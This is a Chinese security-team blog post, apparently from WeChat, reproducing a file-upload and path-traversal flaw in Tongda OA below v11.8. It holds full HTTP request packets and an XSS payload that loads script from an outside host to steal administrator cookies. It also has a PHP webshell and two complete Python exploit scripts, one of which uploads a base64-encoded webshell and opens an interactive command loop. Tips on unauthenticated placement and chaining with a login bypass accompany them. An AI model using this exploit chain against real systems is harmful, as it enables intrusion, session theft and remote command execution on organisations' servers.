> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PMIGxmCLz7BWNERirDOZ1w)

**点击蓝字**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**关注我们**

  

  

**_声明  
_**

本文作者：PeiQi  
本文字数：6858

阅读时长：15min

附件/链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

  

**_前言_**

WgpSec·玄狼 漏洞复现组招收师傅 

有意者简历投至 

**peiqi@wgpsec.org**

一、

**_漏洞描述_**

  

通达OA v11.8以下存在文件上传接口, 对文件后缀过滤不充分导致了允许上传 .user.ini 文件导致文件包含恶意文件

  

二、

**_漏洞影响_**

通达OA V11.8 以下版本  

  

三、

**_漏洞复现_**

这个漏洞我使用了通达OA v11.6 v11.7 v11.8 三个版本进行测试

其中发现了如下几点

*   v11.6 对文件上传位置不限制，可上传文件导致命令执行和XSS
    
*   v11.7 v11.8 都对文件上传位置做了限制，可上传文件导致命令执行和XSS
    
*   在 v11.7 v11.8 中上传的 webshell 我没有绕过OA的过滤，但XSS可使用
    
*   而 v11.6 可以XSS任意页面，命令执行的webshell可绕过
    

  

通达OA v11.6安装包关注公众号回复【 通达OA v11.6 】下载,Windows下载安装，账号为 admin 密码为空

  

出现漏洞的文件为 **webroot/general/hr/manage/staff_info/update.php**

  

```
`<?php``include_once "inc/auth.inc.php";``include_once "inc/utility_all.php";``include_once "inc/utility_file.php";``include_once "inc/utility_field.php";``include_once "inc/utility_cache.php";``include_once "general/system/log/annual_leave_log.php";``if (strstr($BYNAME, "/") || strstr($BYNAME, "\\") || strstr($BYNAME, "..")) {` `Message(_("错误"), _("OA用户名包含非法字符！"));``exit();``}``include_once "inc/header.inc.php";``echo "\r\n<body class=\"bodycolor\">\r\n";``echo "\r\n<body class=\"bodycolor\">\r\n";``$PHOTO_NAME0 = $_FILES["ATTACHMENT"]["name"];``$ATTACHMENT = $_FILES["ATTACHMENT"]["tmp_name"];``if ($PHOTO_NAME0 != "") {` `$FULL_PATH = MYOA_ATTACH_PATH . "hrms_pic";``if (!file_exists($FULL_PATH)) {` `@mkdir($FULL_PATH, 448);` `}` `$PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, "."));` `$FILENAME = MYOA_ATTACH_PATH . "hrms_pic/" . $PHOTO_NAME;` `td_copy($ATTACHMENT, $FILENAME);``if (file_exists($ATTACHMENT)) {` `unlink($ATTACHMENT);` `}``if (!file_exists($FILENAME)) {` `Message(_("附件上传失败"), _("原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！"));` `Button_Back();``exit();` `}`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

在这里参数 **$USER_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了

由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 **.user.ini** 文件来包含其他文件，这里是可以用于包含PHP语句的文件的，所以我们上传文件内容为

```
auto_prepend_file=peiqi.log
```

**请求包为**

```
`POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1``Host: 192.168.1.105``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104``Content-Length: 365``Connection: close``Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31``Upgrade-Insecure-Requests: 1``-----------------------------17518323986548992951984057104``Content-Disposition: form-data;` `Content-Type: text/plain``auto_prepend_file=peiqi.log``-----------------------------17518323986548992951984057104``Content-Disposition: form-data;` `提交``-----------------------------17518323986548992951984057104--`
```

这里上传了文件名为 .user.ini（此文件的作用可自行搜索）

目录为 /general/reportshop/workshop/report/attachment-remark  

  

这里可以发现我们已经成功上传了文件，通过这个文件我们可以包含 peiqi.log 文件执行恶意代码

  

我们先利用XSS漏洞持续获取用户的Cookie来维持权限

因为过滤的不同在v11.6 和 v11.7及以上有不同的利用方法

  

查看文件 webroot/inc/utility_file.php

  

**v11.6的此接口无过滤**

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

v11.6以上版本则规定了这个接口上传的路径必须包含 webroot和attachment

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false)) {` `return false;` `}` `else {` `return true;` `}`
```

**我们先讲讲 v11.6的利用**

  

因为没有上传位置限制我们就可以利用漏洞在主页面或管理员页面插入XSS语句钓鱼或者获取Cookie等敏感信息

  

**首先上传 .user.ini 在管理员界面 /general 目录下**

```
`POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1``Host: 192.168.1.105``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104``Content-Length: 365``Connection: close``Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31``Upgrade-Insecure-Requests: 1``-----------------------------17518323986548992951984057104``Content-Disposition: form-data;` `Content-Type: text/plain``auto_prepend_file=peiqi.log``-----------------------------17518323986548992951984057104``Content-Disposition: form-data;` `提交``-----------------------------17518323986548992951984057104--`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**再上传 peiqi.log 文件到此目录下，其中含有XSS语句**

```
`POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/peiqi HTTP/1.1``Host: 192.168.43.37``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104``Content-Length: 374``Connection: close``Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; creat_work=new; PHPSESSID=51v5lqch5eqvdj1cfh3eggpbt6; SID_1=a663f5dc``Upgrade-Insecure-Requests: 1``-----------------------------17518323986548992951984057104``Content-Disposition: form-data;` `Content-Type: text/plain``<sCRiPt sRC=//xss8.cc/0jiJ></sCrIpT>``-----------------------------17518323986548992951984057104``Content-Disposition: form-data;` `提交``-----------------------------17518323986548992951984057104--`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**当管理员登录时就会触发peiqi.log中的XSS语句**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**刚刚我们说到版本的不同利用点不同，我们只能在 webroot 目录下查找带有 **attachment** 的目录**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里XSS的利用点有4个文件夹，其中最有几率XSS的为**存储目录管理的文件夹**

**/general/system/attachment/**

  

使用同 v11.6的方法上传恶意文件，当管理员使用此模块时就会打回一个Cookie

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因为后续版本限制，v11.6以上版本 xss也受到限制，而 v11.6 版本任意路径可以XSS, 可以在部分补丁打的情况下进行钓鱼管理员

  

这里我写了一个测试POC，用于测试是否存在漏洞（脚本见文末）

  

为了防止XSS影响正常业务，这里上传的位置是一个不常用模块用于验证漏洞

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

就像刚刚上面的方法， 11.6 -11.8 版本中都有这个上传的漏洞

于是我们可以包含PHP代码文件达到命令执行

```
`v11.6 webshell命令执行可以绕过``<?php``$command=$_GET['peiqi'];``$wsh = new COM('WScript.shell');``$exec = $wsh->exec("cmd /c ".$command);``$stdout = $exec->StdOut();``$stroutput = $stdout->ReadAll();``echo $stroutput;``?>`
```

在 v11.7 v11.8 中 webshell被拦截了，我还没绕过去，有思路的师傅私信我交流下意见也可以加群和我们一起讨论  

  

**上****传思路与XSS漏洞一致，只不过文件包含的变成PHP代码**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

现在已经成功上传了恶意文件

访问 http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

利用的POC效果(文末获取)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**Tips**

*   v11.6 木马可上传任意位置，可以上传在登录页面相同目录，不需要权限即可执行命令
    
*   v11.7 v11.8 木马绕过第一时间发文
    
*   v11.6 XSS在登录页面和管理员页面均可，XSS语句怎么好用怎么来
    
*   v11.7 v11.8 XSS位置有限制，不过也有机会
    
*   之前爆出的通达OA 11.7任意用户登录也可以利用上
    
*   可以写脚本检测目标一但上线 XSS 与 webshell 一起上传
    

上面的思路参考了 LoRexxar 师傅的文章，大家可以看一下

https://paper.seebug.org/1499/

  

四、

**_漏洞POC_**

  

**由于是后台漏洞，测试时请修改POC中的Cookie**

  

**通达OA XSS POC**

```
`import requests``import sys``import random``import re``import base64``from requests.packages.urllib3.exceptions import InsecureRequestWarning``def title():` `print('+--------------WgpSec--Team----------------')` `print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')` `print('+  \033[34mVersion: 通达OA < V11.8                                             \033[0m')` `print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')` `print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')` `print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')` `print('+------------------------------------------')``def POC_1(target_url, Cookie):` `vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",``"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",``"Accept-Encoding": "gzip, deflate",``"Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",``"Connection": "close",``"Cookie": Cookie,``"Upgrade-Insecure-Requests": "1",` `}` `data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)` `print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))``if "档案已保存" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m".format(target_url))` `POC_2(target_url, Cookie)``else:` `print("\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m".format(target_url))` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``def POC_2(target_url, Cookie):` `vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",``"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",``"Accept-Encoding": "gzip, deflate",``"Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",``"Connection": "close",``"Cookie":  Cookie,``"Upgrade-Insecure-Requests": "1",` `}` `data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)` `print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))``if "档案已保存" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))` `POC_3(target_url, Cookie)``else:` `print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``def POC_3(target_url, Cookie):` `vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Cookie":  Cookie,` `}``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)` `print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \033[0m".format(target_url))``if "PeiQi_Wiki" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m".format(target_url))``else:` `print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``if __name__ == '__main__':` `title()` `target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))` `Cookie = "USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31"` `POC_1(target_url, Cookie)`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**通达OA 命令执行POC**

```
`import requests``import sys``import random``import re``import base64``from requests.packages.urllib3.exceptions import InsecureRequestWarning``def title():` `print('+--------------WgpSec--Team----------------')` `print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')` `print('+  \033[34mVersion: 通达OA < V11.8                                             \033[0m')` `print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')` `print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')` `print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')` `print('+  \033[36mCmd         >>> whoami                                             \033[0m')` `print('+------------------------------------------')``def POC_1(target_url, Cookie):` `vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",``"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",``"Accept-Encoding": "gzip, deflate",``"Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",``"Connection": "close",``"Cookie": Cookie,``"Upgrade-Insecure-Requests": "1",` `}` `data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)` `print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))``if "档案已保存" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m".format(target_url))` `POC_2(target_url, Cookie)``else:` `print("\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m".format(target_url))` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``def POC_2(target_url, Cookie):` `vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",``"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",``"Accept-Encoding": "gzip, deflate",``"Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",``"Connection": "close",``"Cookie":  Cookie,``"Upgrade-Insecure-Requests": "1",` `}` `data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwCmVjaG8gIlBlaVFpX1dpa2kiOwokY29tbWFuZD0kX0dFVFsncGVpcWknXTsKJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiRzdGRvdXQgPSAkZXhlYy0+U3RkT3V0KCk7CiRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CmVjaG8gJHN0cm91dHB1dDsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)` `print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))``if "档案已保存" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))` `POC_3(target_url, Cookie)``else:` `print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``def POC_3(target_url, Cookie):` `vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=dir"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Cookie":  Cookie,` `}``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)` `print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \033[0m".format(target_url))``if "PeiQi_Wiki" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在漏洞,执行dir \033[0m".format(target_url))` `print("\033[32m[o] 响应为:{} \033[0m".format(response.text))``while True:` `cmd = str(input("\033[36mCmd >>> \033[0m"))` `POC_4(target_url, Cookie, cmd)``else:` `print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``def POC_4(target_url, Cookie, cmd):` `vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi={}".format(cmd)` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",``"Cookie":  Cookie,` `}``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)` `print("\033[32m[o] 响应为:{} \033[0m".format(response.text))``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``if __name__ == '__main__':` `title()` `target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))` `Cookie = "USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31"` `POC_1(target_url, Cookie)`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

  

**_作者_**

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

PeiQi

感谢观看啦~  

  

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)